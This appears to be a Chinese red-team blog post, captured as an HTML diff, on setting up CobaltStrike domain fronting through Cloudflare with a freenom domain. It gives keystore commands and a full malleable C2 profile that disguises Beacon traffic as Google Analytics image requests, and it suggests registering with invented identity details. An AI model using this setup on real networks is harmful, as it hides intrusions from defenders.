@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x01 准备工作需要资源：  VPS   建议国外VPS  CobaltStrike   CobaltStrike 4.3  domain   freenom：https:&#x2F;&#x2F;www.freenom.com&#x2F;   freenom注册：选择伙伴→开发者      选择今天得到一个域名：      填写邮箱信息，之后邮箱收到验证邮件  尽量选择gmail邮箱，不要选择国内163、QQ邮箱，否则可能无">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CobaltStrike域前置学习">
+<meta property="og:url" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="斑马线">
+<meta property="og:description" content="0x01 准备工作需要资源：  VPS   建议国外VPS  CobaltStrike   CobaltStrike 4.3  domain   freenom：https:&#x2F;&#x2F;www.freenom.com&#x2F;   freenom注册：选择伙伴→开发者      选择今天得到一个域名：      填写邮箱信息，之后邮箱收到验证邮件  尽量选择gmail邮箱，不要选择国内163、QQ邮箱，否则可能无">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102600.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102601.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102602.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102603.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102604.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102605.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102606.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102607.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102608.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102609.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026010.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026011.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026012.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026013.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026014.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026015.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026016.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026017.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026018.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026019.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026020.png">
+<meta property="og:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026021.png">
+<meta property="article:published_time" content="2021-11-23T07:31:31.000Z">
+<meta property="article:modified_time" content="2022-10-26T09:18:03.121Z">
+<meta property="article:author" content="givemefivw">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102600.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CobaltStrike域前置学习</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://infrequent-lantana-ee5.notion.site/961c291860d74e2ab7c7a32fd3eb08b7?v=466c252155394b439a6c6189f0ec2384">安全文摘</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2021/11/23/CobaltStrike-CrossC2%E4%B8%8A%E7%BA%BFLinux/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2021/11/17/XradScan/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&text=CobaltStrike域前置学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&title=CobaltStrike域前置学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&is_video=false&description=CobaltStrike域前置学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CobaltStrike域前置学习&body=Check out this article: https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&title=CobaltStrike域前置学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&title=CobaltStrike域前置学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&title=CobaltStrike域前置学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&title=CobaltStrike域前置学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&name=CobaltStrike域前置学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://givemefivw.github.io/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/&t=CobaltStrike域前置学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.</span> <span class="toc-text">0x01 准备工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E8%AE%BE%E7%BD%AEprofile"><span class="toc-number">2.</span> <span class="toc-text">0x02 设置profile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E8%B8%A9%E5%9D%91"><span class="toc-number">3.</span> <span class="toc-text">0x03 踩坑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E9%81%97%E7%95%99%E9%97%AE%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">0x04 遗留问题</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        CobaltStrike域前置学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">givemefivw</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-11-23T07:31:31.000Z" itemprop="datePublished">2021-11-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h2><p>需要资源：</p>
+<ul>
+<li><p>VPS</p>
+<p>  建议国外VPS</p>
+</li>
+<li><p>CobaltStrike</p>
+<p>  CobaltStrike 4.3</p>
+</li>
+<li><p>domain</p>
+<p>  freenom：<a target="_blank" rel="noopener" href="https://www.freenom.com/">https://www.freenom.com/</a></p>
+<p>  freenom注册：选择伙伴→开发者</p>
+<p>  <img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102600.png" alt="Untitled"></p>
+<p>  选择今天得到一个域名：</p>
+<p>  <img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102601.png" alt="Untitled"></p>
+<p>  填写邮箱信息，之后邮箱收到验证邮件</p>
+<blockquote>
+<p>尽量选择gmail邮箱，不要选择国内163、QQ邮箱，否则可能无法验证</p>
+</blockquote>
+<p>  <img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102602.png" alt="Untitled"></p>
+<p>  <img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102603.png" alt="Untitled"></p>
+<p>  然后设置个人信息就可以设置密码登录了。</p>
+<blockquote>
+<p>这里需要把信息与自己VPN代理信息一致，例如VPN用的美国地址，需要将地址填写成美国地址，参考在线生成信息</p>
+</blockquote>
+<p>  注册登录之后，回到首页，选择服务→注册新域名，然后挑选自己的域名，选择checkout</p>
+<p>  <img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102604.png" alt="Untitled"></p>
+<p>  然后选择时限，这里也需要保持IP和个人信息一致。</p>
+<p>  在我的域名里面可以看到选择的域名：</p>
+<p>  <img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102605.png" alt="Untitled">
+  </p>
+</li>
+<li><p>CDN</p>
+<p>  Cloudflare：<a target="_blank" rel="noopener" href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a></p>
+<p>  第一步，使用邮箱注册登录，点击添加站点：</p>
+<p>  <img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102606.png" alt="Untitled"></p>
+<p>  等一分钟会出现完成页面：</p>
+<p>  <img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102607.png" alt="Untitled"></p>
+<p>  第二步，记下替换的两个服务器地址，回到freenom，在域名管理→管理工具里面填写两个地址：</p>
+<p>  <img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102608.png" alt="Untitled"></p>
+<p>  第三步，回到cf，进入域名解析页面，添加www解析，内容填写的是VPS地址：</p>
+<p>  <img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/2022102609.png" alt="Untitled"></p>
+<p>  第四步，等待几分钟，会收到cf邮件，意思是成功对域名提供了服务，这时候利用多地ping测试：<a target="_blank" rel="noopener" href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p>
+<p>  <img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026010.png" alt="Untitled"></p>
+<p>  第五步，cf生成源站服务器证书：</p>
+<p>  <img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026011.png" alt="Untitled"></p>
+<p>  会生成pem和kay文件信息，复制证书信息txt文件保存换格式：</p>
+<p>  <img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026012.png" alt="Untitled"></p>
+<p>  第六步，开启缓存选项：</p>
+<p>  <img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026013.png" alt="Untitled"></p>
+</li>
+</ul>
+<h2 id="0x02-设置profile"><a href="#0x02-设置profile" class="headerlink" title="0x02 设置profile"></a>0x02 设置profile</h2><p>第一步，利用证书重新生成store文件：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in cs.pem -inkey cs.key -out spoofdomain.p12 -name cs.tk -passout pass:123456</span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore new.store -srckeystore spoofdomain.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias cs.tk</span><br></pre></td></tr></table></figure>
+
+<p>第二步，修改teamserver启动项，将kestore位置和密码保持一致：</p>
+<p><img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026014.png" alt="Untitled"></p>
+<p>第三步，生成profile：<a target="_blank" rel="noopener" href="https://github.com/FortyNorthSecurity/C2concealer">github.com&#x2F;FortyNorthSecurity&#x2F;C2concealer</a></p>
+<p>设置store文件的位置，会自动生成profile文件，C2concealer –variant 1 –hostname c2domain：</p>
+<p><img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026015.png" alt="Untitled"></p>
+<p>使用c2lint测试：</p>
+<p><img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026016.png" alt="Untitled"></p>
+<p>第四步，启动teamserver，客户端连接，设置监听Beacon：</p>
+<p><img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026017.png" alt="Untitled"></p>
+<h2 id="0x03-踩坑"><a href="#0x03-踩坑" class="headerlink" title="0x03 踩坑"></a>0x03 踩坑</h2><p>在前面两步全部做好之后，powershell无法上线：</p>
+<p><img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026018.png" alt="Untitled"></p>
+<p>更换国外VPS之后，成功上线，此时地址为CDN：</p>
+<p><img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026019.png" alt="Untitled"></p>
+<p>但新的问题出现了，虽然现在可以上线，但是beacon无法执行命令：</p>
+<p><img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026020.png" alt="Untitled"></p>
+<p>尝试了几次，发现是profile有问题，利用C2concealer生成的随机profile无法回显命令，换用了其他profile（更换host header为自己的c2）：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">http-get &#123;</span><br><span class="line">    set uri <span class="string">&quot;/__utm.gif&quot;</span>;</span><br><span class="line">    client &#123;</span><br><span class="line">        parameter <span class="string">&quot;utmac&quot;</span> <span class="string">&quot;UA-2202604-2&quot;</span>;</span><br><span class="line">        parameter <span class="string">&quot;utmcn&quot;</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        parameter <span class="string">&quot;utmcs&quot;</span> <span class="string">&quot;ISO-8859-1&quot;</span>;</span><br><span class="line">        parameter <span class="string">&quot;utmsr&quot;</span> <span class="string">&quot;1280x1024&quot;</span>;</span><br><span class="line">        parameter <span class="string">&quot;utmsc&quot;</span> <span class="string">&quot;32-bit&quot;</span>;</span><br><span class="line">        parameter <span class="string">&quot;utmul&quot;</span> <span class="string">&quot;en-US&quot;</span>;</span><br><span class="line"></span><br><span class="line">        header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;*.cloudfront.net&quot;</span>;</span><br><span class="line"></span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            prepend <span class="string">&quot;__utma&quot;</span>;</span><br><span class="line">            parameter <span class="string">&quot;utmcc&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;image/gif&quot;</span>;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line"></span><br><span class="line">            prepend <span class="string">&quot;\\x01\\x00\\x01\\x00\\x00\\x02\\x01\\x44\\x00\\x3b&quot;</span>;</span><br><span class="line">            prepend <span class="string">&quot;\\xff\\xff\\xff\\x21\\xf9\\x04\\x01\\x00\\x00\\x00\\x2c\\x00\\x00\\x00\\x00&quot;</span>;</span><br><span class="line">            prepend <span class="string">&quot;\\x47\\x49\\x46\\x38\\x39\\x61\\x01\\x00\\x01\\x00\\x80\\x00\\x00\\x00\\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri <span class="string">&quot;/___utm.gif&quot;</span>;</span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/octet-stream&quot;</span>;</span><br><span class="line"></span><br><span class="line">        id &#123;</span><br><span class="line">            prepend <span class="string">&quot;UA-220&quot;</span>;</span><br><span class="line">            <span class="built_in">append</span> <span class="string">&quot;-2&quot;</span>;</span><br><span class="line">            parameter <span class="string">&quot;utmac&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parameter <span class="string">&quot;utmcn&quot;</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        parameter <span class="string">&quot;utmcs&quot;</span> <span class="string">&quot;ISO-8859-1&quot;</span>;</span><br><span class="line">        parameter <span class="string">&quot;utmsr&quot;</span> <span class="string">&quot;1280x1024&quot;</span>;</span><br><span class="line">        parameter <span class="string">&quot;utmsc&quot;</span> <span class="string">&quot;32-bit&quot;</span>;</span><br><span class="line">        parameter <span class="string">&quot;utmul&quot;</span> <span class="string">&quot;en-US&quot;</span>;</span><br><span class="line"></span><br><span class="line">        header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;*.cloudfront.net&quot;</span>;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;image/gif&quot;</span>;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            prepend <span class="string">&quot;\\x01\\x00\\x01\\x00\\x00\\x02\\x01\\x44\\x00\\x3b&quot;</span>;</span><br><span class="line">            prepend <span class="string">&quot;\\xff\\xff\\xff\\x21\\xf9\\x04\\x01\\x00\\x00\\x00\\x2c\\x00\\x00\\x00\\x00&quot;</span>;</span><br><span class="line">            prepend <span class="string">&quot;\\x47\\x49\\x46\\x38\\x39\\x61\\x01\\x00\\x01\\x00\\x80\\x00\\x00\\x00\\x00&quot;</span>;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-stager &#123;</span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;image/gif&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>上线之后可以得到回显：</p>
+<p><img src="/2021/11/23/CobaltStrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/20221026021.png" alt="Untitled"></p>
+<h2 id="0x04-遗留问题"><a href="#0x04-遗留问题" class="headerlink" title="0x04 遗留问题"></a>0x04 遗留问题</h2><p>上线之后发现beacon不稳定，执行了一个命令之后就可能掉线了，暂时还不知道是什么原因。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://infrequent-lantana-ee5.notion.site/961c291860d74e2ab7c7a32fd3eb08b7?v=466c252155394b439a6c6189f0ec2384">安全文摘</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.</span> <span class="toc-text">0x01 准备工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E8%AE%BE%E7%BD%AEprofile"><span class="toc-number">2.</span> <span class="toc-text">0x02 设置profile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E8%B8%A9%E5%9D%91"><span class="toc-number">3.</span> <span class="toc-text">0x03 踩坑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E9%81%97%E7%95%99%E9%97%AE%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">0x04 遗留问题</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
